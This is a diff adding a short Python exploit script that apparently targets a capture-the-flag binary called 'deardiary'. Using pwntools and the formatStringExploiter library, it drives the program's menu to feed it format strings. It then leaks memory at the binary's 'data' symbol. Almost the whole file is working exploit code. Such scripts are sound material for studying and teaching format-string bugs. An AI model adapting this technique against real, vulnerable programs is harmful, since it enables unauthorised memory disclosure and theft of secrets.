@@ -1,0 +1,34 @@
+#!/usr/bin/env python
+
+from formatStringExploiter.FormatString import FormatString
+from pwn import *
+import IPython
+import logging
+
+logging.basicConfig(level=logging.DEBUG)
+log = logging.getLogger()
+
+fName = "./deardiary"
+
+elf = ELF(fName)
+
+# For deardiary
+def exec_fmt(s):
+    global p
+    p = process(fName,bufSize=0xffff)
+    p.recvuntil("quit")
+    p.sendline("1")
+    p.sendline(s)
+    p.recvuntil("quit")
+    p.sendline("2")
+    p.recvuntil(">")
+    out = p.recvuntil("1.",drop=True)
+    p.recvuntil("quit")
+    p.close()
+    return out
+
+fmtStr = FormatString(exec_fmt,elf=elf)
+
+print(fmtStr.leak.s(elf.symbols['data']))
+
+
